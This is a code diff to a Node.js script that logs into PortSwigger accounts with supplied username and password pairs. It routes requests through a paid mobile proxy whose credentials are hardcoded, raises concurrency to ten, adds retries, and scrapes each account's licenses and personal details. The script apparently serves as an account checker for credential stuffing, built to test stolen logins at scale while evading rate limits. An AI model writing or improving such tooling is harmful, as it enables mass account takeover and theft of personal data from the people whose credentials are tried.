@@ -10,12 +10,25 @@ const readline = require('readline');
 
 const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';
 const CODE_CHALLENGE = 'BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk';
+const CLIENT_ID = 'F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz';
+const REDIRECT_URI = 'https://portswigger.net/signin-oidc';
+const AUTH0_DOMAIN = 'login.portswigger.net';
+
+function generateNonce() {
+    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+}
+
+function generateState() {
+    return Array.from({ length: 43 }, () =>
+        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~'[Math.floor(Math.random() * 66)]
+    ).join('');
+}
 
 const httpsAgent = new HttpsProxyAgent(PROXY);
 const httpAgent = new HttpProxyAgent(PROXY);
 
 const REQUEST_TIMEOUT = 30000;
-const CONCURRENT_REQUESTS = 3;
+const CONCURRENT_REQUESTS = 10;
 const MAX_REDIRECTS = 15;
 const SAVE_HTML = true;
 const TEMPLATES_DIR = 'templates';
@@ -115,6 +128,24 @@ function makeRequest(options, postData = null, cookies = {}) {
     });
 }
 
+async function makeRequestWithRetry(options, postData = null, cookies = {}, maxRetries = 3) {
+    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+        try {
+            return await makeRequest(options, postData, cookies);
+        } catch (err) {
+            const isTimeoutError = err.message.includes('ETIMEDOUT') || err.message.includes('timeout');
+            const isLastAttempt = attempt === maxRetries;
+
+            if (isTimeoutError && !isLastAttempt) {
+                const delayMs = Math.min(1000 * Math.pow(2, attempt - 1), 10000);
+                await new Promise(resolve => setTimeout(resolve, delayMs));
+                continue;
+            }
+            throw err;
+        }
+    }
+}
+
 function urlencode(obj) {
     return Object.entries(obj)
         .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
@@ -160,18 +191,37 @@ async function authenticateAndGetData(username, password) {
     const cookies = {};
 
     try {
-        // Step 1: GET /authorize
-        const authorizeUrl = `https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=${CODE_CHALLENGE}&code_challenge_method=S256&response_mode=query`;
-        let res = await makeRequest({ url: authorizeUrl, method: 'GET' }, null, cookies);
-        let state = res.body.match(/state=([^&\s'"]+)/)?.[1];
+        // Step 1: GET /authorize with Auth0 parameters
+        const nonce = generateNonce();
+        const state = generateState();
+        const auth0Client = Buffer.from(JSON.stringify({
+            name: 'aspnetcore-authentication',
+            version: '1.5.0'
+        })).toString('base64');
 
-        if (!state) throw new Error('State not found in authorize response');
+        const authorizeUrl = `https://${AUTH0_DOMAIN}/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=openid+profile+email&code_challenge=${CODE_CHALLENGE}&code_challenge_method=S256&response_mode=form_post&nonce=${nonce}&auth0Client=${encodeURIComponent(auth0Client)}&state=${state}`;
+
+        let res = await makeRequestWithRetry({ url: authorizeUrl, method: 'GET' }, null, cookies);
+
+        // /authorize endpoint may return 302 redirect or 200 with login form
+        // Follow redirect if needed
+        if ((res.status === 302 || res.status === 301) && res.location) {
+            let redirectUrl = res.location;
+            if (!redirectUrl.startsWith('http')) {
+                redirectUrl = `https://${AUTH0_DOMAIN}${redirectUrl.startsWith('/') ? '' : '/'}${redirectUrl}`;
+            }
+            res = await makeRequestWithRetry({ url: redirectUrl, method: 'GET' }, null, cookies);
+        }
+
+        if (res.status !== 200) {
+            throw new Error(`Auth page returned ${res.status}`);
+        }
 
         // Step 2: POST /u/login
         const loginData = urlencode({ username, password, action: 'default', state });
-        res = await makeRequest(
+        res = await makeRequestWithRetry(
             {
-                url: 'https://login.portswigger.net/u/login',
+                url: `https://${AUTH0_DOMAIN}/u/login`,
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -182,24 +232,32 @@ async function authenticateAndGetData(username, password) {
             cookies
         );
 
-        // Step 3: Follow redirects
-        let redirectUrl = res.location;
-        let redirectCount = 0;
-
-        while (redirectUrl && redirectCount < MAX_REDIRECTS) {
-            if (!redirectUrl.startsWith('http')) {
-                redirectUrl = 'https://login.portswigger.net' + (redirectUrl.startsWith('/') ? '' : '/') + redirectUrl;
-            }
-            res = await makeRequest({ url: redirectUrl, method: 'GET' }, null, cookies);
-            redirectCount++;
-
-            if (res.status !== 302 && res.status !== 301) break;
-            redirectUrl = res.location;
+        // Step 3: Follow /authorize/resume redirect
+        if (!res.location) {
+            throw new Error('No redirect after login');
         }
 
-        // Step 4: Get licenses page
-        res = await makeRequest(
-            { url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' },
+        let redirectUrl = res.location;
+        if (!redirectUrl.startsWith('http')) {
+            redirectUrl = `https://${AUTH0_DOMAIN}${redirectUrl.startsWith('/') ? '' : '/'}${redirectUrl}`;
+        }
+
+        res = await makeRequestWithRetry({ url: redirectUrl, method: 'GET' }, null, cookies);
+
+        // Step 4: Follow remaining redirects (to /auth0/complete and beyond)
+        let redirectCount = 0;
+        while ((res.status === 302 || res.status === 301) && res.location && redirectCount < MAX_REDIRECTS) {
+            redirectUrl = res.location;
+            if (!redirectUrl.startsWith('http')) {
+                redirectUrl = 'https://portswigger.net' + (redirectUrl.startsWith('/') ? '' : '/') + redirectUrl;
+            }
+            res = await makeRequestWithRetry({ url: redirectUrl, method: 'GET' }, null, cookies);
+            redirectCount++;
+        }
+
+        // Step 5: Get subscriptions page
+        res = await makeRequestWithRetry(
+            { url: 'https://portswigger.net/users/youraccount', method: 'GET' },
             null,
             cookies
         );
@@ -209,14 +267,14 @@ async function authenticateAndGetData(username, password) {
         while (res.status === 302 && res.location && redirectAttempts < 10) {
             let nextUrl = res.location;
             if (!nextUrl.startsWith('http')) nextUrl = 'https://portswigger.net' + nextUrl;
-            res = await makeRequest({ url: nextUrl, method: 'GET' }, null, cookies);
+            res = await makeRequestWithRetry({ url: nextUrl, method: 'GET' }, null, cookies);
             redirectAttempts++;
         }
 
         if (res.status === 200 && res.body.length > 500) {
-            // Get personal details
+            // Get personal details (same page)
             const personalRes = await makeRequest(
-                { url: 'https://portswigger.net/users/youraccount/personaldetails', method: 'GET' },
+                { url: 'https://portswigger.net/users/youraccount', method: 'GET' },
                 null,
                 cookies
             );
